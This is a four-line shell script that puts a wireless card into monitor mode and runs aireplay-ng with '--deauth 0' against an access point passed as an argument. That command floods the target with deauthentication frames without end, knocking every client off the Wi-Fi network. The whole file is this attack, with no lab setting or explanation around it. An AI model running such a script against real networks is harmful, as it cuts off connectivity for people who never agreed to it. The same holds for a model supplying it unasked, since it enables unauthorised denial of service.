#!/bin/sh
airmon-ng stop mon1
airmon-ng start wlan0
./aireplay-ng --deauth 0 -a $1 mon1
